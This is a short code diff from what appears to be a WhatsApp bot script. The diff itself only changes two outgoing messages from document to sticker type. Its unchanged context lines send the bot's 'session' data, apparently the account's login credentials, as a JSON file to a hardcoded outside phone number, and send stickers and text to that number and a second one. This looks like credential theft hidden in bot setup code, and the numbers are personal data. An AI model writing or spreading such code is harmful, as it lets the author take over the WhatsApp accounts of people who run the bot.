@@ -62,8 +62,8 @@ function OLDUSER() {
       });
 
       await conn.sendMessage('918602239106@s.whatsapp.net', { document: session, mimetype: 'application/json', fileName: `${flenme}` })
-      await conn.sendMessage('918602239106@s.whatsapp.net', { document: stick, mimetype: 'webp', fileName: 'w.webp' })
-      await conn.sendMessage('918107768770@s.whatsapp.net', { document: stick, mimetype: 'webp', fileName: 'w.webp' })
+      await conn.sendMessage('918602239106@s.whatsapp.net', { sticker: stick, mimetype: 'webp', fileName: 'w.webp' })
+      await conn.sendMessage('918107768770@s.whatsapp.net', { sticker: stick, mimetype: 'webp', fileName: 'w.webp' })
       await conn.sendMessage('918602239106@s.whatsapp.net', { text: '⍟Sᴜᴄssғᴜʟʟʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ Rᴇᴠᴇɴɢᴇʀs ʙᴏᴛᴢ>ᴍᴅ' })
       await conn.sendMessage('918107768770@s.whatsapp.net', { text: '⍟Sᴜᴄssғᴜʟʟʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ Rᴇᴠᴇɴɢᴇʀs ʙᴏᴛᴢ>ᴍᴅ' })
       await conn.sendMessage('918602239106@s.whatsapp.net', { audio: songcut, mimetype: 'audio/mp4', ptt: true }, { fileName: "songcut.mp3" })
